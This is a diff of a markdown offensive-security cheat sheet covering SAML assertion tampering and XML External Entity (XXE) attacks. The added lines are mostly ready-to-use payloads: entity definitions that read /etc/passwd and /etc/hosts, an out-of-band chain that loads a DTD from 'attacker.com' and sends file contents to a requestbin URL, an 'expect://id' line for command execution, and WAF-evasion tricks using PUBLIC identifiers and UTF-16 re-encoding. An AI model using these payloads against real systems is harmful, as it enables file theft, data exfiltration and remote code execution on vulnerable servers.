@@ -41,9 +41,6 @@ Modifying `NotBefore` or `NotOnOrAfter` values.
 Modifying SAML Attributes
 * Some attributes may exist such as `userType`, which you may change to perform privilege escalation.
 
-Signature Attacks
-* [ need more info ]
-
 **Remediation**  
 
 <a href="https://www.owasp.org/index.php/Authentication_Cheat_Sheet">OWASP Auth Cheatsheet</a><br>
@@ -90,7 +87,7 @@ Local File Inclusion
   <lol>&xxe;</lol>
   ```
 
-Remote File Inclusion / SSRF
+Remote File Inclusion / SSRF  
   ```xml
   <!DOCTYPE data [
       <!ELEMENT lol ANY>
@@ -100,22 +97,50 @@ Remote File Inclusion / SSRF
   <lol>&file;</lol>
   ```  
   ```xml
-    <!ENTITY % file SYSTEM "file:///etc/passwd">
-  ```
+  <!ENTITY % file SYSTEM "file:///etc/hosts">
+  ```  
 
-XXE Out of Bounds attack (XXE OOB) - Sending the response/data to your own server
+XXE Out of Bounds attack (XXE OOB) - Sending the response/data to your own server as output doesn't show on site.  
   ```xml
   <!DOCTYPE data [
-    <!ELEMENT lol ANY>
-    <!ENTITY xxe SYSTEM "https://attacker.com/evil.dtd">
-    &xxe;
+    <!ENTITY dtd SYSTEM "https://attacker.com/evil.dtd">
+    &dtd; 
   ]>
+  <data>&send;</data>
   ```
   ```xml
-  <!ENTITY % file SYSTEM "file:///etc/passwd">
+  <!ENTITY % file SYSTEM "file:///etc/hosts">
   <!ENTITY % all "<!ENTITY send SYSTEM 'https://requestbin.fullcontact.com/1cxrgsm1/?%file;'>">
   &all;
   ```
+
+
+**Exploitation: PHP-based** 
+
+RCE (expect:// - Process Interaction Stream)  
+  `<!ENTITY xxe SYSTEM "expect://id">`
+
+PHP Filters  
+  ```xml
+  file:// — Accessing local filesystem
+  http:// — Accessing HTTP(s) URLs
+  ftp:// — Accessing FTP(s) URLs
+  php:// — Accessing various I/O streams
+  zlib:// — Compression Streams
+  data:// — Data (RFC 2397)
+  glob:// — Find pathnames matching pattern
+  phar:// — PHP Archive
+  ssh2:// — Secure Shell 2
+  rar:// — RAR
+  ```  
+
+**Exploitation: Other Tricks**
+
+_WAF_: Use `PUBLIC` if `SYSTEM` is blocked.  
+_Encoding_: Change encoding e.g. UTF-8 -> UTF-16 `<?xml version="1.0" encoding="UTF-16"?>`.  
+^Use `cat file.xml | iconv -f UTF-8 -t UTF-16 > file_utf16.xml` to convert to UTF-16.  
+
+**Remediation**
 
 ### PHP Un-serialize
 ---
